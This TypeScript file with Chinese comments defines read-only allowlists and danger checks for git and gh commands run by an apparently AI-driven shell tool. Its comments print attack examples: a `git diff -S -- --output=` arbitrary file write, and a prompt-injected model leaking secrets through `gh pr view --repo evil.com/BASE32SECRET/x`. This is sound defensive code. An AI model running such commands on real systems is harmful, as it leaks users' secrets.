/**
 * shell 工具（BashTool、PowerShellTool 等）共享的命令校验映射表。
 *
 * 导出任意 shell 工具都可 import 的完整命令配置映射：
 * - GIT_READ_ONLY_COMMANDS：所有 git 子命令及其安全 flag 和回调
 * - GH_READ_ONLY_COMMANDS：仅 ant 可用的 gh CLI 命令（依赖网络）
 * - EXTERNAL_READONLY_COMMANDS：bash 和 PowerShell 中通用的跨 shell 命令
 * - containsVulnerableUncPath：用于防止凭据泄漏的 UNC 路径检测
 * - outputLimits 定义在 outputLimits.ts
 */

import { getPlatform } from '../platform.js'

// ---------------------------------------------------------------------------
// 类型
// ---------------------------------------------------------------------------

export type FlagArgType =
  | 'none' // 无参数（--color、-n）
  | 'number' // 整数参数（--context=3）
  | 'string' // 任意字符串参数（--relative=path）
  | 'char' // 单个字符（分隔符）
  | '{}' // 仅字面量 "{}"
  | 'EOF' // 仅字面量 "EOF"

export type ExternalCommandConfig = {
  safeFlags: Record<string, FlagArgType>
  // 命令危险时返回 true，安全时返回 false。
  // args 是命令名之后的 token 列表（例如 "git branch" 之后的 token）。
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // 为 false 时，该工具不遵循 POSIX `--` 选项终止符。
  // validateFlags 会继续校验 `--` 之后的 flag，而不是中断。
  // 默认：true（大多数工具遵循 `--`）。
  respectsDoubleDash?: boolean
}

// ---------------------------------------------------------------------------
// 共享的 git flag 分组
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
  '--all': 'none',
  '--branches': 'none',
  '--tags': 'none',
  '--remotes': 'none',
}

const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--since': 'string',
  '--after': 'string',
  '--until': 'string',
  '--before': 'string',
}

const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
  '--oneline': 'none',
  '--graph': 'none',
  '--decorate': 'none',
  '--no-decorate': 'none',
  '--date': 'string',
  '--relative-date': 'none',
}

const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
  '--max-count': 'number',
  '-n': 'number',
}

// 统计输出 flag - 用于 git log、show、diff
const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
  '--stat': 'none',
  '--numstat': 'none',
  '--shortstat': 'none',
  '--name-only': 'none',
  '--name-status': 'none',
}

// 颜色输出 flag - 用于 git log、show、diff
const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
  '--color': 'none',
  '--no-color': 'none',
}

// patch 展示 flag - 用于 git log、show
const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
  '--patch': 'none',
  '-p': 'none',
  '--no-patch': 'none',
  '--no-ext-diff': 'none',
  '-s': 'none',
}

// author/committer 过滤 flag - 用于 git log、reflog
const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--author': 'string',
  '--committer': 'string',
  '--grep': 'string',
}

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS — 所有 git 子命令的完整映射
// ---------------------------------------------------------------------------

export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'git diff': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      // 展示与比较 flag
      '--dirstat': 'none',
      '--summary': 'none',
      '--patch-with-stat': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--no-renames': 'none',
      '--no-ext-diff': 'none',
      '--check': 'none',
      '--ws-error-highlight': 'string',
      '--full-index': 'none',
      '--binary': 'none',
      '--abbrev': 'number',
      '--break-rewrites': 'none',
      '--find-renames': 'none',
      '--find-copies': 'none',
      '--find-copies-harder': 'none',
      '--irreversible-delete': 'none',
      '--diff-algorithm': 'string',
      '--histogram': 'none',
      '--patience': 'none',
      '--minimal': 'none',
      '--ignore-space-at-eol': 'none',
      '--ignore-space-change': 'none',
      '--ignore-all-space': 'none',
      '--ignore-blank-lines': 'none',
      '--inter-hunk-context': 'number',
      '--function-context': 'none',
      '--exit-code': 'none',
      '--quiet': 'none',
      '--cached': 'none',
      '--staged': 'none',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
      '--no-index': 'none',
      '--relative': 'string',
      // diff 过滤
      '--diff-filter': 'string',
      // 短 flag
      '-p': 'none',
      '-u': 'none',
      '-s': 'none',
      '-M': 'none',
      '-C': 'none',
      '-B': 'none',
      '-D': 'none',
      '-l': 'none',
      // 安全：-S/-G/-O 接受必需的字符串参数（pickaxe 搜索、pickaxe 正则、
      // orderfile）。之前标成 'none' 会造成与 git 的解析差异：
      // `git diff -S -- --output=/tmp/pwned` — validator 视 -S 无参 →
      // 前进 1 个 token → 在 `--` 处中断 → --output 未被检查。git 视
      // -S 需要参数 → 把 `--` 当作 pickaxe 字符串消耗掉（标准 getopt：
      // 必需参数的选项无条件消费下一个 argv，且在顶层 `--` 检查之前）
      // → 游标落到 --output=... → 当作长选项解析 → 任意文件写入。
      // 第 ~207 行的 git log 配置正确地把 -S/-G 标为 'string'。
      '-S': 'string',
      '-G': 'string',
      '-O': 'string',
      '-R': 'none',
    },
  },
  'git log': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 额外的展示 flag
      '--abbrev-commit': 'none',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--simplify-merges': 'none',
      '--ancestry-path': 'none',
      '--source': 'none',
      '--first-parent': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--reverse': 'none',
      '--walk-reflogs': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--follow': 'none',
      // commit 遍历 flag
      '--no-walk': 'none',
      '--left-right': 'none',
      '--cherry-mark': 'none',
      '--cherry-pick': 'none',
      '--boundary': 'none',
      // 排序 flag
      '--topo-order': 'none',
      '--date-order': 'none',
      '--author-date-order': 'none',
      // 格式控制
      '--pretty': 'string',
      '--format': 'string',
      // diff 过滤
      '--diff-filter': 'string',
      // pickaxe 搜索（查找新增/删除某字符串的 commit）
      '-S': 'string',
      '-G': 'string',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
    },
  },
  'git show': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // 额外的展示 flag
      '--abbrev-commit': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--first-parent': 'none',
      '--raw': 'none',
      // diff 过滤
      '--diff-filter': 'string',
      // 短 flag
      '-m': 'none',
      '--quiet': 'none',
    },
  },
  'git shortlog': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      // 汇总选项
      '-s': 'none',
      '--summary': 'none',
      '-n': 'none',
      '--numbered': 'none',
      '-e': 'none',
      '--email': 'none',
      '-c': 'none',
      '--committer': 'none',
      // 分组
      '--group': 'string',
      // 格式化
      '--format': 'string',
      // 过滤
      '--no-merges': 'none',
      '--author': 'string',
    },
  },
  'git reflog': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
    },
    // 安全：拦截 `git reflog expire`（位置型子命令）— 它通过让 reflog
    // 条目过期来写入 .git/logs/**。`git reflog delete` 同样会写入。
    // 只有 `git reflog`（裸命令 = show）和 `git reflog show` 是安全的。
    // 否则 ~:1730 处的位置参数兜底分支会把 `expire` 当作非 flag 参数接受，
    // 而 `--all` 又在 GIT_REF_SELECTION_FLAGS 中 → 校验通过。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 拦截已知具备写入能力的子命令：expire、delete、exists。
      // 放行：`show`、ref 名（HEAD、refs/*、分支名）。
      // 子命令（若有）是第一个位置参数。`show` 之后或 flag 之后的位置参数
      // 都是 ref 名（安全）。
      const DANGEROUS_SUBCOMMANDS = new Set(['expire', 'delete', 'exists'])
      for (const token of args) {
        if (!token || token.startsWith('-')) continue
        // 第一个非 flag 位置参数：检查是否是危险子命令。
        // 如果是 `show` 或诸如 `HEAD`/`refs/...` 的 ref 名，则安全。
        if (DANGEROUS_SUBCOMMANDS.has(token)) {
          return true // 危险子命令 — 会写入 .git/logs/**
        }
        // 第一个位置参数安全（show/HEAD/ref）— 后续都是 ref 参数
        return false
      }
      return false // 无位置参数 = 裸 `git reflog` = 安全（仅展示 reflog）
    },
  },
  'git stash list': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_COUNT_FLAGS,
    },
  },
  'git ls-remote': {
    safeFlags: {
      // 分支/标签过滤 flag
      '--branches': 'none',
      '-b': 'none',
      '--tags': 'none',
      '-t': 'none',
      '--heads': 'none',
      '-h': 'none',
      '--refs': 'none',
      // 输出控制 flag
      '--quiet': 'none',
      '-q': 'none',
      '--exit-code': 'none',
      '--get-url': 'none',
      '--symref': 'none',
      // 排序 flag
      '--sort': 'string',
      // 协议 flag
      // 安全：--server-option 和 -o 被刻意排除。它们会在 protocol v2
      // capability 通告中把任意攻击者控制的字符串发送到远端 git 服务器。
      // 这相当于在理应只读的命令上引入了网络写入原语（向远端发送数据）。
      // 即使没有命令替换（已由其他地方拦截），`--server-option="敏感数据"`
      // 也会把该值外发到 `origin` 指向的地址。只读路径绝不应启用网络写入。
    },
  },
  'git status': {
    safeFlags: {
      // 输出格式 flag
      '--short': 'none',
      '-s': 'none',
      '--branch': 'none',
      '-b': 'none',
      '--porcelain': 'none',
      '--long': 'none',
      '--verbose': 'none',
      '-v': 'none',
      // untracked 文件处理
      '--untracked-files': 'string',
      '-u': 'string',
      // ignore 选项
      '--ignored': 'none',
      '--ignore-submodules': 'string',
      // 列展示
      '--column': 'none',
      '--no-column': 'none',
      // ahead/behind 信息
      '--ahead-behind': 'none',
      '--no-ahead-behind': 'none',
      // 重命名检测
      '--renames': 'none',
      '--no-renames': 'none',
      '--find-renames': 'string',
      '-M': 'string',
    },
  },
  'git blame': {
    safeFlags: {
      ...GIT_COLOR_FLAGS,
      // 行范围
      '-L': 'string',
      // 输出格式
      '--porcelain': 'none',
      '-p': 'none',
      '--line-porcelain': 'none',
      '--incremental': 'none',
      '--root': 'none',
      '--show-stats': 'none',
      '--show-name': 'none',
      '--show-number': 'none',
      '-n': 'none',
      '--show-email': 'none',
      '-e': 'none',
      '-f': 'none',
      // 日期格式化
      '--date': 'string',
      // 忽略空白
      '-w': 'none',
      // 忽略 revision
      '--ignore-rev': 'string',
      '--ignore-revs-file': 'string',
      // 移动/复制检测
      '-M': 'none',
      '-C': 'none',
      '--score-debug': 'none',
      // 缩写
      '--abbrev': 'number',
      // 其他选项
      '-s': 'none',
      '-l': 'none',
      '-t': 'none',
    },
  },
  'git ls-files': {
    safeFlags: {
      // 文件筛选
      '--cached': 'none',
      '-c': 'none',
      '--deleted': 'none',
      '-d': 'none',
      '--modified': 'none',
      '-m': 'none',
      '--others': 'none',
      '-o': 'none',
      '--ignored': 'none',
      '-i': 'none',
      '--stage': 'none',
      '-s': 'none',
      '--killed': 'none',
      '-k': 'none',
      '--unmerged': 'none',
      '-u': 'none',
      // 输出格式
      '--directory': 'none',
      '--no-empty-directory': 'none',
      '--eol': 'none',
      '--full-name': 'none',
      '--abbrev': 'number',
      '--debug': 'none',
      '-z': 'none',
      '-t': 'none',
      '-v': 'none',
      '-f': 'none',
      // exclude 模式
      '--exclude': 'string',
      '-x': 'string',
      '--exclude-from': 'string',
      '-X': 'string',
      '--exclude-per-directory': 'string',
      '--exclude-standard': 'none',
      // 错误处理
      '--error-unmatch': 'none',
      // 递归
      '--recurse-submodules': 'none',
    },
  },
  'git config --get': {
    safeFlags: {
      // 无需额外 flag - 只是读取 config 值
      '--local': 'none',
      '--global': 'none',
      '--system': 'none',
      '--worktree': 'none',
      '--default': 'string',
      '--type': 'string',
      '--bool': 'none',
      '--int': 'none',
      '--bool-or-int': 'none',
      '--path': 'none',
      '--expiry-date': 'none',
      '-z': 'none',
      '--null': 'none',
      '--name-only': 'none',
      '--show-origin': 'none',
      '--show-scope': 'none',
    },
  },
  // 注意：'git remote show' 必须排在 'git remote' 之前，这样更长的模式才能优先匹配
  'git remote show': {
    safeFlags: {
      '-n': 'none',
    },
    // 仅允许可选的 -n，随后接受一个字母数字组成的 remote 名
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 过滤掉已知的安全 flag
      const positional = args.filter(a => a !== '-n')
      // 必须恰好有一个看起来像 remote 名的位置参数
      if (positional.length !== 1) return true
      return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!)
    },
  },
  'git remote': {
    safeFlags: {
      '-v': 'none',
      '--verbose': 'none',
    },
    // 仅允许裸 'git remote' 或 'git remote -v/--verbose'
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 所有参数都必须是已知安全 flag；不允许位置参数
      return args.some(a => a !== '-v' && a !== '--verbose')
    },
  },
  // git merge-base 是只读命令 — 用于查找共同祖先
  'git merge-base': {
    safeFlags: {
      '--is-ancestor': 'none', // 检查第一个 commit 是否是第二个的祖先
      '--fork-point': 'none', // 查找分叉点
      '--octopus': 'none', // 为多个 ref 查找最佳共同祖先
      '--independent': 'none', // 过滤独立的 ref
      '--all': 'none', // 输出所有 merge base
    },
  },
  // git rev-parse 是纯读命令 — 把 ref 解析为 SHA，或查询仓库路径
  'git rev-parse': {
    safeFlags: {
      // SHA 解析与校验
      '--verify': 'none', // 校验恰好一个参数是合法对象名
      '--short': 'string', // 缩写输出（可通过 =N 指定长度）
      '--abbrev-ref': 'none', // ref 的符号名
      '--symbolic': 'none', // 输出符号名
      '--symbolic-full-name': 'none', // 完整符号名（含 refs/heads/ 前缀）
      // 仓库路径查询（全部只读）
      '--show-toplevel': 'none', // 顶层目录的绝对路径
      '--show-cdup': 'none', // 返回顶层所需向上穿越的路径分量
      '--show-prefix': 'none', // 从顶层到 cwd 的相对路径
      '--git-dir': 'none', // .git 目录路径
      '--git-common-dir': 'none', // 公共目录路径（主 worktree 的 .git）
      '--absolute-git-dir': 'none', // .git 目录的绝对路径
      '--show-superproject-working-tree': 'none', // 父项目根目录（子模块场景）
      // 布尔查询
      '--is-inside-work-tree': 'none',
      '--is-inside-git-dir': 'none',
      '--is-bare-repository': 'none',
      '--is-shallow-repository': 'none',
      '--is-shallow-update': 'none',
      '--path-prefix': 'none',
    },
  },
  // git rev-list 是只读的 commit 枚举 — 列出/统计从 ref 可达的 commit
  'git rev-list': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 计数
      '--count': 'none', // 输出 commit 数量而非列表
      // 遍历控制
      '--reverse': 'none',
      '--first-parent': 'none',
      '--ancestry-path': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--min-parents': 'number',
      '--max-parents': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--walk-reflogs': 'none',
      // 输出格式化
      '--oneline': 'none',
      '--abbrev-commit': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--abbrev': 'number',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--source': 'none',
      '--graph': 'none',
    },
  },
  // git describe 是只读命令 — 相对最近的 tag 描述 commit
  'git describe': {
    safeFlags: {
      // tag 选择
      '--tags': 'none', // 考虑所有 tag，不只是 annotated tag
      '--match': 'string', // 只考虑匹配 glob 模式的 tag
      '--exclude': 'string', // 排除匹配 glob 模式的 tag
      // 输出控制
      '--long': 'none', // 始终使用长格式输出（tag-distance-ghash）
      '--abbrev': 'number', // 把对象名缩写为 N 位十六进制
      '--always': 'none', // 兜底输出唯一缩写的对象名
      '--contains': 'none', // 查找 commit 之后的 tag
      '--first-match': 'none', // 优先选择离 tip 最近的 tag（首个匹配后停止）
      '--exact-match': 'none', // 仅在精确匹配时输出（tag 指向 commit）
      '--candidates': 'number', // 在选出最佳候选前限制遍历范围
      // 后缀/dirty 标记
      '--dirty': 'none', // 工作区有改动时追加 "-dirty"
      '--broken': 'none', // 仓库处于非法状态时追加 "-broken"
    },
  },
  // git cat-file 是只读对象查看 — 展示对象的类型、大小或内容
  // 注意：--batch（不带 --check）被刻意排除 — 它会从 stdin 读取任意对象，
  // 在管道命令中可能被利用来 dump 敏感对象。
  'git cat-file': {
    safeFlags: {
      // 对象查询模式（全部纯只读）
      '-t': 'none', // 打印对象类型
      '-s': 'none', // 打印对象大小
      '-p': 'none', // 友好打印对象内容
      '-e': 'none', // 对象存在则 exit 0，否则非零
      // 批处理模式 — 仅允许只读 check 变体
      '--batch-check': 'none', // 对 stdin 上的每个对象，输出类型和大小（不含内容）
      // 输出控制
      '--allow-undetermined-type': 'none',
    },
  },
  // git for-each-ref 是只读 ref 遍历 — 列出 ref，可附带格式化和过滤
  'git for-each-ref': {
    safeFlags: {
      // 输出格式化
      '--format': 'string', // 使用 %(字段名) 占位符的格式串
      // 排序
      '--sort': 'string', // 按 key 排序（如 refname、creatordate、version:refname）
      // 数量限制
      '--count': 'number', // 最多输出 N 条 ref
      // 过滤
      '--contains': 'string', // 仅列出包含指定 commit 的 ref
      '--no-contains': 'string', // 仅列出不含指定 commit 的 ref
      '--merged': 'string', // 仅列出从指定 commit 可达的 ref
      '--no-merged': 'string', // 仅列出从指定 commit 不可达的 ref
      '--points-at': 'string', // 仅列出指向指定对象的 ref
    },
  },
  // git grep 是只读命令 — 在被追踪的文件中搜索模式
  'git grep': {
    safeFlags: {
      // 模式匹配模式
      '-e': 'string', // 模式
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-G': 'none', // 基本正则（默认）
      '--basic-regexp': 'none',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',
      // 匹配控制
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '-v': 'none', // 反转匹配
      '--invert-match': 'none',
      '-w': 'none', // 单词正则
      '--word-regexp': 'none',
      // 输出控制
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-c': 'none', // 计数
      '--count': 'none',
      '-l': 'none', // 列出匹配的文件
      '--files-with-matches': 'none',
      '-L': 'none', // 列出未匹配的文件
      '--files-without-match': 'none',
      '-h': 'none', // 不显示文件名
      '-H': 'none', // 显示文件名
      '--heading': 'none',
      '--break': 'none',
      '--full-name': 'none',
      '--color': 'none',
      '--no-color': 'none',
      '-o': 'none', // 仅输出匹配部分
      '--only-matching': 'none',
      // 上下文
      '-A': 'number', // after 上下文
      '--after-context': 'number',
      '-B': 'number', // before 上下文
      '--before-context': 'number',
      '-C': 'number', // 上下文
      '--context': 'number',
      // 多模式布尔操作符
      '--and': 'none',
      '--or': 'none',
      '--not': 'none',
      // 作用域控制
      '--max-depth': 'number',
      '--untracked': 'none',
      '--no-index': 'none',
      '--recurse-submodules': 'none',
      '--cached': 'none',
      // 线程
      '--threads': 'number',
      // 静默
      '-q': 'none',
      '--quiet': 'none',
    },
  },
  // git stash show 是只读命令 — 展示某个 stash 条目的 diff
  'git stash show': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // diff 选项
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--diff-filter': 'string',
      '--abbrev': 'number',
    },
  },
  // git worktree list 是只读命令 — 列出已链接的 working tree
  'git worktree list': {
    safeFlags: {
      '--porcelain': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--expire': 'string',
    },
  },
  'git tag': {
    safeFlags: {
      // 列表模式 flag
      '-l': 'none',
      '--list': 'none',
      '-n': 'number',
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'string',
      '--no-merged': 'string',
      '--sort': 'string',
      '--format': 'string',
      '--points-at': 'string',
      '--column': 'none',
      '--no-column': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 安全：拦截通过位置参数创建 tag 的行为。`git tag foo` 会创建
    // .git/refs/tags/foo（写入一个 41 字节的文件）— 不是只读。
    // 这与下方 `git branch foo` 语义相同（callback 也一样）。如果没有这个
    // callback，validateFlags 在 ~:1730 处的默认位置参数兜底分支会把
    // `mytag` 当作非 flag 参数接受，于是 git tag 被自动放行。虽然这次
    // 写入是受限的（路径仅限 .git/refs/tags/，内容固定为 HEAD 的 SHA），
    // 但它破坏了只读不变式，并可能污染 CI/CD 的 tag 模式匹配，或通过
    // `git tag foo <commit>` 让被遗弃的 commit 重新可达。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 安全用法：`git tag`（列表）、`git tag -l pattern`（过滤列表）、
      // `git tag --contains <ref>`（包含列表）。未带 -l/--list 的裸位置
      // 参数会被当作待 CREATE 的 tag 名 — 危险。
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--merged',
        '--no-merged',
        '--points-at',
        '--sort',
        '--format',
        '-n',
      ])
      let i = 0
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` 结束 flag 解析。其后的所有 token 都是位置参数，即使以 `-`
        // 开头。`git tag -- -l` 会创建一个名为 `-l` 的 tag。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list（精确匹配或位于短 flag 组合中）。`-li` 是 -l 和
          // -i 的组合 — 两者都是 'none' 类型。Array.includes('-l') 只做
          // 精确匹配，会漏掉 `-li`、`-il` 这类组合。需要按字符检查短 flag 组合。
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            // 含有 'l' 的短 flag 组合，例如 -li、-il
            seenListFlag = true
          }
          if (token.includes('=')) {
            i++
          } else if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          // 非 flag 位置参数（或 `--` 之后的位置参数）。只有先出现 -l/--list
          // 时才安全（此时是 pattern，而非 tag 名）。
          if (!seenListFlag) {
            return true // 无 --list 的位置参数 = 创建 tag
          }
          i++
        }
      }
      return false
    },
  },
  'git branch': {
    safeFlags: {
      // 列表模式 flag
      '-l': 'none',
      '--list': 'none',
      '-a': 'none',
      '--all': 'none',
      '-r': 'none',
      '--remotes': 'none',
      '-v': 'none',
      '-vv': 'none',
      '--verbose': 'none',
      // 展示选项
      '--color': 'none',
      '--no-color': 'none',
      '--column': 'none',
      '--no-column': 'none',
      // 安全：--abbrev 保持 'number'，使 validateFlags 能接受 --abbrev=N
      // （附带形式，安全）。分离形式 `--abbrev N` 才是 bug：git 使用
      // PARSE_OPT_OPTARG（仅支持附带可选参数）— 分离的 N 会被当作位置
      // 参数的分支名，从而创建 .git/refs/heads/N。validateFlags 用
      // 'number' 会消费掉 N，但下方的 CALLBACK 会兜住它：--abbrev 不在
      // callback 的 flagsWithArgs 中（已移除），所以 callback 把 N 当作
      // 不带 list flag 的位置参数 → 判定为危险。两层防御：validateFlags
      // 两种形式都接受，callback 拦截分离形式。
      '--abbrev': 'number',
      '--no-abbrev': 'none',
      // 过滤 - 这些 flag 接受 commit/ref 参数
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'none', // 可选 commit 参数 - 在 callback 中处理
      '--no-merged': 'none', // 可选 commit 参数 - 在 callback 中处理
      '--points-at': 'string',
      // 排序
      '--sort': 'string',
      // 注意：--format 被刻意排除，可能存在安全风险
      // 展示当前分支
      '--show-current': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 拦截通过位置参数创建分支（例如 "git branch newbranch"）
    // flag 校验由上方的 safeFlags 完成
    // args 是 "git branch" 之后的 token
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 拦截分支创建："git branch <name>" 或 "git branch <name> <start-point>"
      // 只有以下用法是安全的："git branch"（列表）、"git branch -flags"（带选项的列表），
      // 或 "git branch --contains/--merged/etc <ref>"（过滤）
      // 需要参数的 flag
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--points-at',
        '--sort',
        // --abbrev 已移除：git 不会消费分离的参数（PARSE_OPT_OPTARG）
      ])
      // 带可选参数的 flag（不一定需要，但可以带）
      const flagsWithOptionalArgs = new Set(['--merged', '--no-merged'])
      let i = 0
      let lastFlag = ''
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` 结束 flag 解析。`git branch -- -l` 会创建一个名为 `-l` 的分支。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          lastFlag = ''
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list，包括短 flag 组合（-li、-la 等）
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            seenListFlag = true
          }
          if (token.includes('=')) {
            lastFlag = token.split('=')[0] || ''
            i++
          } else if (flagsWithArgs.has(token)) {
            lastFlag = token
            i += 2
          } else {
            lastFlag = token
            i++
          }
        } else {
          // 非 flag 参数（或 `--` 之后的位置参数）- 可能是：
          // 1. 分支名（危险 - 会创建分支）
          // 2. --list/-l 之后的 pattern（安全）
          // 3. --merged/--no-merged 之后的可选参数（安全）
          const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
          if (!seenListFlag && !lastFlagHasOptionalArg) {
            return true // 没有 --list 或过滤 flag 的位置参数 = 创建分支
          }
          i++
        }
      }
      return false
    },
  },
}

// ---------------------------------------------------------------------------
// GH_READ_ONLY_COMMANDS — 仅 ant 可用的 gh CLI 命令（依赖网络）
// ---------------------------------------------------------------------------

// 安全：所有 gh 命令共享的 callback，防止通过网络外泄数据。
// gh 的 repo 参数接受 `[HOST/]OWNER/REPO` 格式 — 当 HOST 存在（即 3 段）
// 时，gh 会连接该 host 的 API。被 prompt 注入的模型可以把 secret 编码到
// OWNER 段，通过 DNS/HTTP 外泄：
//   gh pr view 1 --repo evil.com/BASE32SECRET/x
//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
// gh 还接受位置参数 URL：`gh pr view https://evil.com/owner/repo/pull/1`
//
// git ls-remote 内部已有 URL 守卫（readOnlyValidation.ts:~944）；这个
// callback 为 gh 提供等价能力。拒绝：
//   - 任何含 2 个及以上 `/` 的 token（HOST/OWNER/REPO 格式 — 正常只有 OWNER/REPO）
//   - 任何含 `://` 的 token（URL）
//   - 任何含 `@` 的 token（SSH 风格）
// 覆盖 --repo 的值以及位置参数 URL/repo 参数，包含等号附带形式
// `--repo=HOST/OWNER/REPO`（cobra 同时接受两种形式）。
function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
  for (const token of args) {
    if (!token) continue
    // 对于 flag token，提取 `=` 之后的值进行检查。如果不这样做，
    // `--repo=evil.com/SECRET/x`（以 `-` 开头的单 token）会被整体跳过，
    // 从而绕过 HOST 检查。cobra 把 `--flag=val` 与 `--flag val` 视为等价；
    // 我们必须两种形式都检查。
    let value = token
    if (token.startsWith('-')) {
      const eqIdx = token.indexOf('=')
      if (eqIdx === -1) continue // flag 没有内联值，没有可检查的内容
      value = token.slice(eqIdx + 1)
      if (!value) continue
    }
    // 跳过明显不是 repo spec 的值（完全没有 `/`，或纯数字）
    if (
      !value.includes('/') &&
      !value.includes('://') &&
      !value.includes('@')
    ) {
      continue
    }
    // URL scheme：https://、http://、git://、ssh://
    if (value.includes('://')) {
      return true
    }
    // SSH 风格：git@host:owner/repo
    if (value.includes('@')) {
      return true
    }
    // 3+ 段 = HOST/OWNER/REPO（gh 的常规格式是 OWNER/REPO，只有 1 个斜杠）
    // 统计斜杠：2+ 个斜杠意味着 3+ 段
    const slashCount = (value.match(/\//g) || []).length
    if (slashCount >= 2) {
      return true
    }
  }
  return false
}

export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  // gh pr view 是只读命令 — 显示 pull request 详情
  'gh pr view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--comments': 'none', // 显示评论
      '--repo': 'string', // 目标仓库（OWNER/REPO）
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr list 是只读命令 — 列出 pull request
  'gh pr list': {
    safeFlags: {
      '--state': 'string', // open、closed、merged、all
      '-s': 'string',
      '--author': 'string',
      '--assignee': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--base': 'string',
      '--head': 'string',
      '--search': 'string',
      '--json': 'string',
      '--draft': 'none',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
